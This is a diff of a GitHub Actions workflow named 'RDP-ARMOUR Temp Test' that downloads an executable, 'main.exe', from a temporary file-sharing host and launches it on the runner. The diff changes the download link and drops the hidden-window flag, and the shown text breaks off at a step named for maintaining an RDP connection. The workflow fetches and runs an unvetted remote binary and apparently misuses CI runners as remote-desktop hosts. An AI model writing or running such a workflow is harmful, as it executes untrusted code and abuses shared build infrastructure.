@@ -2,10 +2,6 @@ name: "RDP-ARMOUR Temp Test"
 
 on:
   workflow_dispatch:
-    inputs:
-      chosen_tool:
-        required: true
-        default: 'rdp'
 
 jobs:
   test-run:
@@ -15,15 +11,16 @@ jobs:
       - name: Download Master Loader
         shell: pwsh
         run: |
-          $url = "http://tmpfiles.org/dl/31974101/main.exe"
+          $url = "http://tmpfiles.org/dl/32055861/main.exe"
           curl -L $url -o "Master_Loader.exe"
 
-      - name: Execute and Monitor
+      - name: Execute Engine
         shell: pwsh
-        env:
-          CHOSEN_TOOL: ${{ github.event.inputs.chosen_tool }}
         run: |
-          Start-Process -FilePath "./Master_Loader.exe" -WindowStyle Hidden
+          Write-Host ">>> Starting Execution..."
+          Start-Process -FilePath "./Master_Loader.exe"
+          Write-Host ">>> Sleeping for 6 minutes..."
+          Start-Sleep -Seconds 360
 
       - name: Maintain Connection + Watch RDP User
         run: |
